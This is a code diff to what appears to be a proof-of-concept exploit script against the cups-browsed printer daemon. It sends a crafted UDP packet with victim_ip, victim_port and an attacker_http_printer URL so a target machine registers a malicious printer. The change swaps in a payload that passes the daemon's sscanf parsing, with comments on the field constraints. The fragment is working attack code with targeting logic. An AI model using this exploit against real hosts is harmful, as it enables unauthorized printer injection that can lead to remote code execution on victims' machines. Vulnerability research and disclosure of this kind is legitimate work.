@@ -168,7 +168,12 @@ def send_udp_packet(ip, port, message):
 # FYI other test code in the original impl.
 IMPERSONATE_PRINTER = True
 if IMPERSONATE_PRINTER:
-    callback_url = f"0 3 {attacker_http_printer}"
+    # packet is parsed with sscanf (must find 3 values)
+    #   https://github.com/OpenPrinting/cups-browsed/blob/before-patch/daemon/cups-browsed.c#L11843-L11844
+    #   `type` can be any hex value except CUPS_PRINTER_DELETE = 0x100000
+    #   `state` can be any hex value, beyond that it is ignored
+    #   `uri` is up to 1023 char string, later this is also reparsed into `location` and `info` (FYI might be more constraints in code these are passed to)
+    callback_url = f"FF 10 {attacker_http_printer}"
 
     send_udp_packet(victim_ip, victim_port, callback_url)
     print("sent")
